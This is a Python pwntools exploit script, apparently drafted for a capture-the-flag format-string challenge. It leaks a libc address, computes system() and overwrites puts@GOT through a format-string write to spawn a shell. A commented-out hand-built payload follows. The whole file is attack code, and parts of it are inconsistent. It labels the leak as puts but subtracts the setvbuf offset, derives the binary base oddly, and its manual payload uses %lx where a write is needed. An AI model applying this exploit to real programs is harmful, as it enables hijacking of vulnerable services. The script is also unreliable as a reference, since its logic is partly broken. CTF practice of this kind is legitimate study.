from pwn import *

# Load the binary and libc
binary = ELF('./format-string-3')  # Replace with the actual binary
libc = ELF('./libc.so.6')  # Replace with the actual libc used

# Offsets
puts_got_offset = binary.got['puts']
setvbuf_offset = libc.symbols['setvbuf']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']

# Connect to the remote service
p = process('format-string-3')  # Replace with the actual host and port

# Leak a libc address (e.g., puts)
p.recvuntil(b'libc: ')
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked puts address: {hex(leak)}")

# Calculate libc base and system() address
log.info(f"setvbuf off: {hex(setvbuf_offset)}")
libc_base = leak - setvbuf_offset
system_addr = libc_base + system_offset
log.info(f"Libc base: {hex(libc_base)}")
log.info(f"system() address: {hex(system_addr)}")

# Calculate the runtime location of puts@GOT
binary_base = libc_base - libc.symbols['__libc_start_main'] + binary.symbols['__libc_start_main']
puts_got = binary_base + puts_got_offset
log.info(f"puts@GOT address: {hex(puts_got)}") 

def send_fmt_payload(payload):
    print(repr(payload))

f = FmtStr(send_fmt_payload, offset=38)
f.write(puts_got,system_addr)
f.execute_writes()
'''
# Format string exploit
# Split system() address into lower and higher bytes
lower_bytes = system_addr & 0xffff
higher_bytes = (system_addr >> 16) & 0xffff

# Adjust for padding
#padding = 4  # Adjust based on stack layout
lower_offset = 38  # Replace with correct offset in format string
higher_offset = lower_offset + 1  # Adjust if necessary

# Build the payload
payload =  p64(puts_got) + p64(puts_got + 2)  # Overwrite lower and higher bytes of puts@GOT
if lower_bytes <= higher_bytes:
    payload += f"%{lower_bytes}c%{lower_offset}$lx".encode()  # Write lower bytes
    payload += f"%{higher_bytes-lower_bytes}c%{higher_offset}$lx".encode()  # Write higher bytes
else:
    payload += f"%{higher_bytes}c%{higher_offset}$lx".encode()  # Write higher bytes first
    payload += f"%{lower_bytes-higher_bytes}c%{lower_offset}$lx".encode()  # Write lower bytes

log.info(f"Heres the payload: {payload}")
# Send the payload
p.sendline(payload)

# Trigger the exploit (call puts with /bin/sh as an argument)
#p.sendline(b'/bin/sh\x00')

# Get an interactive shell
p.interactive()
'''
